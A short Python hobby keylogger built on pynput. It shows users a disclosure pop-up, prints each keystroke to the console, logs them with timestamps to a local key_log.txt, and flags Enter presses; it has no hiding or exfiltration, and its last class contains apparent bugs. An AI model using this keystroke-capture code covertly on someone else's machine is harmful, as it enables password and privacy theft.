# My keylogger!
# Necessary inputs
from pynput import keyboard
from pynput.keyboard import Listener
import logging, tkinter.messagebox
from tkinter import *

root=Tk() # A simple pop-up interface to inform users of how the program works.
tkinter.messagebox.showinfo('Popup Window(Information)','This keylogger does two things:\n1. Keystrokes are displayed in the console\n'
                                                        '2. Keystrokes are logged and kept in key_log.txt for further viewing.\n'
                                                        'Press escape once to end the console log, and a seocnd time for the txt file. ') # Pop-up message
root.mainloop() # Starts pop-up.

class Record: # Class to output keystrokes to terminal


    def on_press(key):
        print('Key {} pressed.'.format(key)) # Records key presses

    def on_release(key):
        print('Key {} released.'.format(key)) # Records key releases
        if str(key) == 'Key.esc':
            print('Exiting application...') # Exits application if the ESC key is hit
            return False
        if str(key)=='Key.enter':
            print('SPECIAL KEY PRESSED!!!') # Detects if 'enter' has been pressed and notifies the user.
            # assists with detecting certain strokes the use may find important.

    with keyboard.Listener( # Uses the imported library to ensure programs "on_press" equals its own
        on_press = on_press,
        on_release = on_release) as listener:
        listener.join()



class Logger: # Logs keystrokes and sends to a file
    log_dir = "" # Left blank so it'll appear in the same folder as this application

    logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s') # File will be called key_log.txt,
    # formatted with time and message

    def on_press(key): # Records key presses only
        logging.info(str(key)) # Logs key press to file
        if str(key) == 'Key.esc':
            print('Ending log...')
            return False

    with Listener(on_press=on_press) as listener: # Ensures program's on_press equal's library's
        listener.join()

class LoggerNotice: # Class for making specific notes in the log when certain keys are pressed
    log_dir = "" # Left blank so it'll appear in the same folder as this application

    logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.INFO, format='%(message)s') # File will be called key_log.txt,
    # formatted with time and message

    def on_press(key): # Records key presses only
        if 'Key.enter' in (key):
            logging.info(str("IMPORTANT KEY PRESSED!!!")) # If 'enter' is pressed, it's recorded in the log file.
